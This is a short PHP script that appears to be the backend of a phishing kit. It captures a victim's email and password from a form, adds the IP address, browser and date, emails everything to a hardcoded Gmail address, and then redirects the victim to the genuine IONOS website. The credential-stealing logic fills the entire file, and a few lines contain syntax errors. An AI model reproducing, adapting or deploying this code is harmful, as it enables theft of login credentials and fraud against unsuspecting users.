<?php

$Email = $_POST['email'];
$password = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "*************Created by GHOST *************\n";
$message .= "Email    : ".$Email."\n";
$message .= "Password   : ".$password."\n";
$message .= "IP Address : $ip"\n";
$message .= "--------------------\n";
$message .= "Date : $adddate"\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "**************Hustle Hard***************\n";
$message .= "* Success is Loading... *\n";

$send="yariaortega@gmail.com";



$subject = "$Email - IP: ".$ip."\n ";
$headers = "";
$str=array($send); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){

header("Location: https://www.ionos.de/");
}

?>